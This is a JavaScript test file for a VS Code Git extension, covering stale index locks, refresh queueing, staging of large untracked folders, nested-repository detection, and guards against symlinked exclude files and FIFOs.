  await new Promise((resolve) => setTimeout(resolve, 300));
  started = Date.now();
  repo.running.cancel();
  err = await rejection(stage);
  // (Bounds far below the 30 s it would otherwise wait: a busy machine starts git slowly.)
  assert.ok(Date.now() - started < 10000, `stopped ${Date.now() - started} ms after cancelling`);
  // Left by a git process that crashed an hour ago: nobody releases it, no waiting, and it is said.
  const hourAgo = new Date(Date.now() - 3600e3);
  fs.utimesSync(lock, hourAgo, hourAgo);
  started = Date.now();
  err = await rejection(repo.stage(['c.txt']));
  assert.ok(Date.now() - started < 10000, `failed after ${Date.now() - started} ms`);
  assert.equal(err.code, 'StaleLock');
  assert.match(err.message, /index\.lock is 60 minutes old: probably left behind by a git process that stopped \(crashed or was killed\)\. If no git command is running/);
});

test('only git\'s own "Unable to create … .lock" line counts as a held lock (not a path listed in other output)', () => {
  const { GitError } = require('../src/git/exec');
  const code = (stderr) => new GitError({ args: ['add'], exitCode: 128, stdout: '', stderr }).code;
  assert.equal(code("fatal: Unable to create '/r/.git/index.lock': File exists.\n\nAnother git process seems to be running"), 'IndexLocked');
  assert.equal(code("error: cannot lock ref 'refs/heads/x': Unable to create '/r/.git/refs/heads/x.lock': File exists."), 'IndexLocked');
  assert.notEqual(code("error: The following untracked working tree files would be overwritten by merge:\n\tUnable to create '/net/host/x.lock': File exists\nPlease move or remove them"), 'IndexLocked');
});

test('excludeLocally() ignores a folder in this clone and its worktrees only, once, never through a symlink', async (t) => {
  const { r, repo } = await based(t);
  r.write('.local-work/c1/x.txt', 'x\n');
  await repo.excludeLocally('/.local-work/');
  await repo.excludeLocally('/.local-work/');
  const exclude = path.join(r.dir, '.git', 'info', 'exclude');
  assert.equal(fs.readFileSync(exclude, 'utf8').split('\n').filter((l) => l === '/.local-work/').length, 1);
  assert.equal(r.git('status', '--porcelain'), '', 'the folder is ignored');
  assert.equal(fs.existsSync(path.join(r.dir, '.gitignore')), false, 'nothing to commit');
  await assert.rejects(repo.excludeLocally('a\nb'), /single line/);
  // From a linked worktree: the shared exclude file (the worktree's own git dir has none).
  const wtDir = path.join(makeTempDir('cc-wt-'), 'wt');
  t.after(() => fs.rmSync(path.dirname(wtDir), { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'wt', wtDir);
  const wt = await Repository.open(wtDir);
  t.after(() => wt.dispose());
  fs.writeFileSync(path.join(wtDir, 'gen.txt'), 'g\n');
  await wt.excludeLocally('/gen.txt');
  assert.ok(fs.readFileSync(exclude, 'utf8').split('\n').includes('/gen.txt'));
  assert.equal(execFileSync('git', ['status', '--porcelain'], { cwd: wtDir, encoding: 'utf8' }), '');
});

test('excludeLocally() refuses a symlinked exclude file or info folder', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await based(t);
  const info = path.join(r.dir, '.git', 'info');
  const outside = makeTempDir('cc-outside-');
  t.after(() => fs.rmSync(outside, { recursive: true, force: true }));
  const target = path.join(outside, 'target.txt');
  fs.writeFileSync(target, '');
  fs.rmSync(path.join(info, 'exclude'), { force: true });
  fs.symlinkSync(target, path.join(info, 'exclude'));
  await assert.rejects(repo.excludeLocally('/x/'), /symbolic link/);
  assert.equal(fs.readFileSync(target, 'utf8'), '');
  fs.rmSync(info, { recursive: true, force: true });
  fs.symlinkSync(outside, info);
  await assert.rejects(repo.excludeLocally('/x/'), /symbolic link/);
  assert.equal(fs.existsSync(path.join(outside, 'exclude')), false);
});

test('tracksFilesIn() says whether git tracks files in a folder', async (t) => {
  const { r, repo } = await based(t);
  r.commit('src', { 'src/a.js': 'a\n' });
  r.write('src/gen/x.js', 'x\n');
  r.write('.local-work/c/x.js', 'x\n');
  assert.equal(await repo.tracksFilesIn('src/'), true);
  assert.equal(await repo.tracksFilesIn('src/gen/'), false);
  assert.equal(await repo.tracksFilesIn('.local-work/'), false);
});

/**
 * A RepositoryManager with one fake repository whose refreshState() waits until the test
 * releases it, recording what each call saw when it started.
 */
function refreshHarness(t) {
  const { RepositoryManager } = requireWithVscode('../src/vscode/model');
  const manager = new RepositoryManager();
  const gitDir = makeTempDir('cc-gitdir-');
  const h = { manager, calls: [], running: 0, most: 0, world: 0, releases: [] };
  h.repo = {
    root: '/fake/repo',
    gitDir,
    async refreshState() {
      h.calls.push(h.world);
      h.running++;
      h.most = Math.max(h.most, h.running);
      await new Promise((resolve) => h.releases.push(resolve));
      h.running--;
    },
    async getRefTips() {
      return '';
    },
    dispose() {},
  };
  /** Let the oldest waiting refreshState() finish; resolves once the next one (if any) started. */
  h.release = async () => {
    h.releases.shift()();
    for (let k = 0; k < 10; k++) await new Promise((resolve) => setImmediate(resolve));
  };
  manager.repos.set(h.repo.root, h.repo);
  t.after(() => {
    while (h.releases.length) h.releases.shift()();
    manager.repos.delete(h.repo.root);
    manager.dispose();
    fs.rmSync(gitDir, { recursive: true, force: true });
  });
  return h;
}

test('refreshes asked for while one runs make one more after it, never several at once, and it sees what changed meanwhile', async (t) => {
  const h = refreshHarness(t);
  const first = h.manager.refresh(h.repo);
  await new Promise((resolve) => setImmediate(resolve));
  h.world = 1; // a file changes while the first status runs
  const asked = [];
  for (let k = 0; k < 5; k++) asked.push(h.manager.refresh(h.repo));
  assert.equal(h.calls.length, 1, 'no second status while the first runs');
  await h.release();
  await first;
  assert.deepEqual(h.calls, [0, 1], 'one follow-up, started after the change');
  await h.release();
  await Promise.all(asked);
  assert.equal(h.most, 1, 'never two at once');
  const later = h.manager.refresh(h.repo);
  assert.equal(h.calls.length, 3, 'asked when none runs: one right away');
  await h.release();
  await later;
});

test('a refresh queued for a repository closed meanwhile does not run, also when its folder is opened again', async (t) => {
  const h = refreshHarness(t);
  const first = h.manager.refresh(h.repo);
  const queued = h.manager.refresh(h.repo);
  h.manager.repos.delete(h.repo.root);
  h.manager.repos.set(h.repo.root, { ...h.repo, refreshState: () => assert.fail('the new repository is not refreshed by the old one\'s queue') });
  await h.release();
  await Promise.all([first, queued]);
  assert.equal(h.calls.length, 1);
});

test('Activity and Worktrees pages closed while they load post nothing (no "Webview is disposed")', async () => {
  const { createVscode } = require('./helpers/vscodeMock');
  requireWithVscode('../src/vscode/model');
  const { ActivityPanel } = require('../src/vscode/webviews/activityPanel');
  const { WorktreesPanel } = require('../src/vscode/webviews/worktreesPanel');
  const { vscode } = createVscode();
  const fakePanel = () => {
    const dispose = new vscode.EventEmitter();
    const panel = {
      visible: true,
      disposed: false,
      posted: [],
      onDidDispose: dispose.event,
      onDidChangeViewState: () => ({ dispose() {} }),
      dispose() {
        panel.disposed = true;
        dispose.fire();
      },
      webview: {
        cspSource: 'test',
        asWebviewUri: (u) => u,
        onDidReceiveMessage: () => ({ dispose() {} }),
        postMessage(m) {
          if (panel.disposed) throw new Error('Webview is disposed');
          panel.posted.push(m);
        },
      },
    };
    return panel;
  };
  let release;
  const slow = new Promise((resolve) => (release = resolve));
  const repo = {
    root: '/fake', name: 'fake', state: undefined,
    activity: () => slow.then(() => ({ commits: [] })),
    getWorktreeDetails: () => slow.then(() => []),
    getRemotes: async () => [],
    getConfig: async () => '',
  };
  const ctx = { extensionUri: vscode.Uri.file('/ext'), manager: { onDidChangeState: () => ({ dispose() {} }), onDidClose: () => ({ dispose() {} }) } };
  for (const Page of [ActivityPanel, WorktreesPanel]) {
    const panel = fakePanel();
    const page = new Page(ctx, panel, repo);
    const loading = page.send();
    panel.dispose(); // closed while git still works
    release();
    await loading; // must not throw
    await page.send(); // a debounced send after closing: nothing
    assert.ok(panel.posted.every((m) => m.type !== 'data'), `${Page.name}: nothing posted after closing`);
  }
});

test('a refresh stuck for the time limit no longer holds the ones asked for meanwhile, however many', async (t) => {
  const h = refreshHarness(t);
  h.manager.stuckRefreshMs = 200;
  h.manager.refresh(h.repo); // hangs: never released
  const asked = [];
  for (let k = 0; k < 3; k++) {
    await new Promise((resolve) => setTimeout(resolve, 40));
    asked.push(h.manager.refresh(h.repo)); // agents keep writing
  }
  assert.equal(h.calls.length, 1, 'within the limit: queued behind it');
  await until(() => h.calls.length === 2, 'the queued refresh started once the first counts as stuck', 2000);
  await h.release(); // (the stuck one)
  await h.release(); // the queued one finishes
  await Promise.all(asked);
});

/** Poll until `fn` returns something truthy. */
async function until(fn, what, ms = 5000) {
  const end = Date.now() + ms;
  for (;;) {
    if (await fn()) return;
    if (Date.now() > end) throw new Error(`Timed out waiting for ${what}`);
    await new Promise((resolve) => setTimeout(resolve, 10));
  }
}

test('overlapping statuses: an older one finishing first is shown, one finishing after a newer is not', async (t) => {
  const { r, repo } = await based(t);
  // Hold each `git status` until the test lets it go, in any order.
  const held = [];
  const exec = repo.exec.bind(repo);
  repo.exec = (args, opts) => (args[0] === 'status'
    ? new Promise((resolve) => held.push(() => resolve(exec(args, opts))))
    : exec(args, opts));
  let published = 0;
  repo.on('didChangeState', () => published++);
  r.write('one.txt', '1\n');
  const older = repo.refreshState();
  await until(() => held.length === 1, 'the first status');
  r.write('two.txt', '2\n');
  const newer = repo.refreshState();
  await until(() => held.length === 2, 'the second status');
  held[0]();
  await older;
  assert.equal(published, 1, 'the older one is shown when nothing newer is (a stuck newer would hide it forever)');
  held[1]();
  await newer;
  assert.equal(published, 2);
  assert.ok(repo.state.untracked.some((e) => e.path === 'two.txt'));
  // The other order: the newer one finishes first; the older, later, is not shown over it.
  r.write('three.txt', '3\n');
  const a = repo.refreshState();
  await until(() => held.length === 3, 'status a');
  const b = repo.refreshState();
  await until(() => held.length === 4, 'status b');
  held[3]();
  await b;
  held[2]();
  await a;
  assert.equal(published, 3, 'the older result, finishing last, is not published');
});

test('what counts as a repository nested in the working tree: git\'s rule, and nothing that could block', async (t) => {
  const { r, repo } = await based(t);
  // A .git folder with only HEAD (an agent's cp -r halfway): git lists and stages its files.
  fs.mkdirSync(path.join(r.dir, 'half', '.git'), { recursive: true });
  fs.writeFileSync(path.join(r.dir, 'half', '.git', 'HEAD'), 'ref: refs/heads/main\n');
  assert.equal(repo.nestedRepositoryOf('half/a.txt'), undefined);
  // "gitdir:" not on the first line: not a gitfile to git.
  r.git('init', '-q', path.join(r.dir, 'real'));
  r.write('late/.git', `# note\ngitdir: ${path.join(r.dir, 'real', '.git')}\n`);
  assert.equal(repo.nestedRepositoryOf('late/a.txt'), undefined);
  r.write('good/.git', `gitdir: ${path.join(r.dir, 'real', '.git')}\r\n`);
  assert.equal(repo.nestedRepositoryOf('good/a.txt'), 'good/', 'a CRLF gitfile naming a repository');
  // A huge "gitfile" is not read.
  r.write('huge/.git', `gitdir: ${path.join(r.dir, 'real', '.git')}\n${'x'.repeat(100000)}`);
  assert.equal(repo.nestedRepositoryOf('huge/a.txt'), undefined);
  if (process.platform !== 'win32') {
    // A FIFO or a device named .git: answered at once, never read.
    fs.mkdirSync(path.join(r.dir, 'fifo'));
    execFileSync('mkfifo', [path.join(r.dir, 'fifo', '.git')]);
    fs.mkdirSync(path.join(r.dir, 'dev'));
    fs.symlinkSync('/dev/zero', path.join(r.dir, 'dev', '.git'));
    const started = Date.now();
    assert.equal(repo.nestedRepositoryOf('fifo/a.txt'), undefined);
    assert.equal(repo.nestedRepositoryOf('dev/a.txt'), undefined);
    assert.ok(Date.now() - started < 1000);
  }
});

test('thousands of new files in a folder are staged as the folder, its nested repositories left out', async (t) => {
  const { r, repo } = await based(t);
  repo.untrackedMode = 'normal';
  for (let k = 0; k < 1500; k++) r.write(`.local-work/copy/f${k}.txt`, `${k}\n`);
  r.write('.local-work/c1/x.txt', 'x\n');
  r.git('init', '-q', path.join(r.dir, '.local-work', 'c1'));
  r.write('small/a.txt', 'a\n');
  await repo.refreshState();
  assert.deepEqual(await repo.untrackedFolders(), ['.local-work/', 'small/'], 'git\'s summary by folder');
  const args = [];
  const run = repo.run.bind(repo);
  repo.run = (a, o) => {
    args.push(a);
    return run(a, o);
  };
  await repo.stage(['.local-work/', 'small/']);
  const add = args.find((a) => a[0] === 'add');
  assert.ok(add.length < 20, `one pathspec per folder, not 1,500 (${add.length} arguments)`);
  assert.ok(add.includes(':(exclude,literal).local-work/c1'), add.join(' '));
  const staged = r.git('diff', '--cached', '--name-only').split('\n');
  assert.equal(staged.length, 1501);
  assert.ok(!staged.some((p) => p.startsWith('.local-work/c1')));
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m);
});

test('a repository created in a big folder between its status and git add is taken out again and reported', async (t) => {
  const { r, repo } = await based(t);
  for (let k = 0; k < 1200; k++) r.write(`work/f${k}.txt`, `${k}\n`);
  r.write('work/late/x.txt', 'x\n');
  await repo.refreshState();
  // The repository appears (with a commit) the moment git add starts.
  const exec = repo.exec.bind(repo);
  repo.exec = async (a, o) => {
    if (a[0] === 'add') {
      const late = path.join(r.dir, 'work', 'late');
      execFileSync('git', ['-C', late, 'init', '-q']);
      execFileSync('git', ['-C', late, '-c', 'user.name=T', '-c', 'user.email=t@x', 'commit', '-q', '--allow-empty', '-m', 'x']);
    }
    return exec(a, o);
  };
  const err = await rejection(repo.stage(['work/']));
  assert.equal(err.code, 'NotStaged');
  assert.deepEqual(err.nested, ['work/late/']);
  assert.doesNotMatch(r.git('ls-files', '-s'), /^160000/m, 'no gitlink left in the index');
  assert.equal(r.git('diff', '--cached', '--name-only').split('\n').length, 1200);
  assert.match(err.message, /^"work\/late\/" was not staged: it is a separate Git repository/);
});

test('a .git folder git does not count (empty) makes no nested repository in "normal" mode either: the folder is a row to stage', async (t) => {
  const { r, repo } = await based(t);
  repo.untrackedMode = 'normal';
  r.write('x/f.txt', 'f\n');
  fs.mkdirSync(path.join(r.dir, 'x', '.git'));
  const s = await repo.refreshState();
  assert.deepEqual(repo.nestedRepositories(s), []);
  assert.deepEqual(s.untracked.map((e) => e.path), ['x/f.txt'], 'listed (file by file, as a folder with a .git in it is), not hidden');
  assert.deepEqual(await repo.untrackedFolders(), ['x/']);
  await repo.stage(['x/']);
  assert.equal(r.git('diff', '--cached', '--name-only'), 'x/f.txt');
});

test('"gitdir:" without the space git requires is no gitfile', async (t) => {
  const { r, repo } = await based(t);
  r.git('init', '-q', path.join(r.dir, 'real'));
  r.write('nospace/.git', `gitdir:${path.join(r.dir, 'real', '.git')}\n`);
  assert.equal(repo.nestedRepositoryOf('nospace/a.txt'), undefined);
});

test('a repository without a commit made in a big folder while git add starts: the rest is staged, it is reported', async (t) => {
  const { r, repo } = await based(t);
  for (let k = 0; k < 1200; k++) r.write(`work/f${k}.txt`, `${k}\n`);
  r.write('work/late/x.txt', 'x\n');
  await repo.refreshState();
  r.write('work/later/y.txt', 'y\n');
  const exec = repo.exec.bind(repo);
  let made = false;
  repo.exec = async (a, o) => {
    if (a[0] === 'add' && !made) {
      made = true;
      // Two at once (agents work in parallel), neither with a commit.
      for (const d of ['late', 'later']) execFileSync('git', ['-C', path.join(r.dir, 'work', d), 'init', '-q']);
    }
    return exec(a, o);
  };
  const err = await rejection(repo.stage(['work/']));
  assert.equal(err.code, 'NotStaged', err.message);
  assert.deepEqual(err.nested.sort(), ['work/late/', 'work/later/']);
  assert.equal(r.git('diff', '--cached', '--name-only').split('\n').length, 1200);
});

test('hundreds of folder rows: the gitlink check lists the index once instead of a command line too long', async (t) => {
  const { r, repo } = await based(t);
  repo.untrackedMode = 'normal';
  const rows = [];
  for (let k = 0; k < 250; k++) {
    r.write(`row${k}/f.txt`, `${k}\n`);
    rows.push(`row${k}/`);
  }
  r.write('row7/inner/x.txt', 'x\n');
  await repo.refreshState();
  await repo.stage(rows);
  assert.equal(r.git('diff', '--cached', '--name-only').split('\n').length, 251);
  // The check itself: no folder list on the command line (Windows allows 32 KB in all).
  const calls = [];
  const exec = repo.exec.bind(repo);
  repo.exec = (a, o) => {
    if (a[0] === 'ls-files') calls.push(a);
    return exec(a, o);
  };
  const links = await repo.gitlinksIn(rows);
  assert.equal(links.size, 0);
  assert.ok(calls.length && calls.every((a) => !a.includes('--')), `the whole index, once: ${JSON.stringify(calls.map((a) => a.length))}`);
});

test('unstageNew() takes fresh entries out again and leaves a staged deletion of the same path staged', async (t) => {
  const { r, repo } = await based(t);
  r.commit('secret', { 'secret.env': 's\n' });
  r.git('rm', '-q', '--cached', 'secret.env'); // staged deletion, file kept
  r.write('new.txt', 'n\n');
  await repo.stage(['secret.env', 'new.txt']);
  await repo.unstageNew(['secret.env', 'new.txt', 'never-added.txt']);
  assert.equal(r.git('status', '--porcelain'), 'D  secret.env\n?? new.txt\n?? secret.env');
  // No commit yet: also fine.
  const e = createRepo();
  t.after(() => e.cleanup());
  const empty = await Repository.open(e.dir);
  t.after(() => empty.dispose());
  e.write('a.txt', 'a\n');
  await empty.stage(['a.txt']);
  await empty.unstageNew(['a.txt', 'c1/f']);
  assert.equal(e.git('status', '--porcelain'), '?? a.txt');
});

test('pathspec variables in the environment do not change what the literal and exclude pathspecs mean', async (t) => {
  const { r, repo } = await based(t);
  for (const k of ['GIT_LITERAL_PATHSPECS', 'GIT_ICASE_PATHSPECS']) {
    const saved = process.env[k];
    process.env[k] = '1';
    t.after(() => (saved === undefined ? delete process.env[k] : (process.env[k] = saved)));
  }
  r.write('A.txt', 'upper\n');
  r.write('weird[1].txt', 'w\n');
  await repo.refreshState();
  await repo.stage(['weird[1].txt']);
  assert.equal(r.git('diff', '--cached', '--name-only'), 'weird[1].txt', 'only that file (not A.txt by case)');
});

test('tracksFilesIn() matches any casing (a case-insensitive disk lists the folder in another)', async (t) => {
  const { r, repo } = await based(t);
  r.commit('gen', { 'Gen/kept.txt': 'k\n' });
  assert.equal(await repo.tracksFilesIn('gen/'), true);
});

test('the check after git add sees what the add left, not a stage or unstage of ours queued right behind it', async (t) => {
  const { r, repo } = await based(t);
  r.write('n.txt', 'n\n');
  await repo.refreshState();
  // Not awaited in between: the unstage is queued while the add runs.
  const staging = repo.stage(['n.txt']);
  const unstaging = repo.unstage(['n.txt']);
  await staging; // no "was not staged" for a file that was staged (and then unstaged on purpose)
  await unstaging;
  assert.equal(r.git('status', '--porcelain', '--', 'n.txt'), '?? n.txt');
});

test('past the status limit, only content edits of listed untracked files skip the refresh', () => {
  const { untrackedEditOverLimit } = requireWithVscode('../src/vscode/model');
  const many = Array.from({ length: 10001 }, (_, k) => ({ path: `.local-work/c/f${k}` }));
  const repo = (untracked) => ({
    state: { conflicts: [], staged: [], unstaged: [], untracked },
    relative: (p) => path.relative('/repo', p).split(path.sep).join('/'),
  });
  assert.equal(untrackedEditOverLimit(repo(many), '/repo/.local-work/c/f5'), true);
  assert.equal(untrackedEditOverLimit(repo(many), '/repo/src/tracked.js'), false, 'a tracked file still refreshes');
  assert.equal(untrackedEditOverLimit(repo(many.slice(0, 10)), '/repo/.local-work/c/f5'), false, 'under the limit: dots and counts follow content');
});

test('not-staged messages for every mix: files in, folders that are, and folders that hold repositories', () => {
  const { notStagedMessage } = require('../src/git/repository');
  const m = (paths, map, o) => notStagedMessage(paths, new Map(Object.entries(map)), o);
  assert.match(m(['w/', 'a/x'], { 'w/': ['w/c/'], 'a/x': ['a/'] }), /^2 items were not staged: they belong to "w\/c\/" and "a\/", separate Git repositories/);
  assert.match(m(['copy/', 'b/'], { 'copy/': ['copy/'], 'b/': ['b/'] }), /they are "copy\/" and "b\/", separate .* Stage their files in those repositories\.$/);
  assert.match(m(['w/', 'v/'], { 'w/': ['w/c/'], 'v/': ['v/d/'] }), /they hold only "w\/c\/" and "v\/d\/", .* Stage their files in those repositories\.$/);
  assert.match(m(['c1/x', 'c1/y'], { 'c1/x': ['c1/'], 'c1/y': ['c1/'] }), /^2 files were not staged: they are in "c1\/", a separate Git repository .* Stage them in that repository\.$/);
  assert.match(m(['a/x', 'p.txt'], { 'a/x': ['a/'] }, { commit: true }), /^Nothing committed: "a\/x" is in "a\/", .* out of the selection\. git also left out "p\.txt", without saying why\.$/);
  assert.equal(m(['p.txt'], {}, { commit: true }), 'Nothing committed: git did not stage "p.txt" and did not say why.');
});

test('Open Repository: a repository whose root git names outside is never opened (no git status runs there)', async (t) => {
  const { r } = await based(t);
  const { RepositoryManager } = requireWithVscode('../src/vscode/model');
  const manager = new RepositoryManager();
  t.after(() => manager.dispose());
  let refreshed = false;
  const opened = await manager.openRepository(r.dir, {
    accept: (repo) => {
      repo.refreshState = () => {
        refreshed = true;
      };
      return false;
    },
  });
  assert.equal(opened, undefined);
  assert.equal(manager.repositories.length, 0);
  assert.equal(refreshed, false);
});

test('staging thousands of listed untracked files by folder stages exactly those listed, not files made since', async (t) => {
  const { r, repo } = await based(t);
  for (let k = 0; k < 1500; k++) r.write(`.local-work/copy/f${k}.txt`, `${k}\n`);
  r.write('top-new.txt', 't\n');
  const s = await repo.refreshState();
  const listed = s.untracked.map((e) => e.path);
  // Written after the list was read: in a listed folder, in a new folder, at the top.
  r.write('.local-work/copy/late.txt', 'late\n');
  r.write('later/x.txt', 'x\n');
  r.write('late-top.txt', 'l\n');
  const { paths, excludes } = await repo.untrackedAsListed(listed);
  assert.deepEqual(paths.sort(), ['.local-work/', 'top-new.txt']);
  assert.deepEqual(excludes.sort(), ['.local-work/copy/late.txt', 'late-top.txt', 'later/x.txt']);
  await repo.stage(paths, { excludes });
  const staged = r.git('diff', '--cached', '--name-only').split('\n');
  assert.equal(staged.length, 1501);
  assert.ok(!staged.includes('.local-work/copy/late.txt') && !staged.includes('later/x.txt') && !staged.includes('late-top.txt'));
  // Many files made since: the listed ones themselves.
  r.git('reset', '-q');
  for (let k = 0; k < 250; k++) r.write(`burst/b${k}.txt`, `${k}\n`);
  const again = await repo.untrackedAsListed(listed);
  assert.equal(again.paths, listed);
  assert.deepEqual(again.excludes, []);
});

test('Open Repository works when git and node name the repository root differently (subst drive, macOS casing)', async (t) => {
  const { r, repo } = await based(t);
  r.git('init', '-q', path.join(r.dir, 'c1'));
  const { RepositoryManager } = requireWithVscode('../src/vscode/model');
  const { openNestedRepository } = require('../src/vscode/commands/scmCommands');
  const manager = new RepositoryManager();
  t.after(() => {
    for (const x of manager.repositories) manager.closeRepository(x);
    manager.dispose();
  });
  // git's root (Windows: "D:\real\repo" behind subst S:) is a path node cannot resolve to the
  // folder you opened; the opened one (displayRoot) is the folder itself.
  repo.displayRoot = r.dir;
  repo.root = path.join(path.dirname(r.dir), 'as-git-names-it', path.basename(r.dir));
  manager.repos.set(repo.root, repo);
  await openNestedRepository(manager, repo, 'c1/');
  // (Windows: the root is written "c:\…" as VS Code does; the folder made here "C:\…".)
  const same = (a, b) => (process.platform === 'win32' ? a.toLowerCase() === b.toLowerCase() : a === b);
  const opened = manager.repositories.find((x) => same(x.root, path.join(r.dir, 'c1')));
  assert.ok(opened, `the nested repository opened (open: ${manager.repositories.map((x) => x.root).join(', ')})`);
  assert.equal(manager.active, opened);
  manager.repos.delete(repo.root);
  if (process.platform === 'win32') return; // (symbolic links need privileges there)
  // And one outside both roots is refused, before git runs there.
  const outside = makeTempDir('cc-outside-');
  t.after(() => fs.rmSync(outside, { recursive: true, force: true }));
  execFileSync('git', ['init', '-q', outside]);
  fs.symlinkSync(outside, path.join(r.dir, 'link'), 'dir');
  await openNestedRepository(manager, repo, 'link/');
  assert.ok(!manager.repositories.some((x) => x.root === fs.realpathSync(outside)), 'a link to a repository elsewhere is not opened');
});

test('a .git swapped for a FIFO between the check and the read never blocks', { skip: process.platform === 'win32' && 'no FIFOs on Windows' }, async (t) => {
  const { r, repo } = await based(t);
  fs.mkdirSync(path.join(r.dir, 'swapped'));
  const dotGit = path.join(r.dir, 'swapped', '.git');
  execFileSync('mkfifo', [dotGit]);
  // What the check sees: a small regular file (it was one a moment ago).
  const statSync = fs.statSync;
  fs.statSync = (p, ...rest) => (path.resolve(String(p)) === dotGit
    ? { isDirectory: () => false, isFile: () => true, size: 20 }
    : statSync(p, ...rest));
  t.after(() => (fs.statSync = statSync));
  const started = Date.now();
  assert.equal(repo.nestedRepositoryOf('swapped/a.txt'), undefined);
  assert.ok(Date.now() - started < 1000, 'answered at once');
});
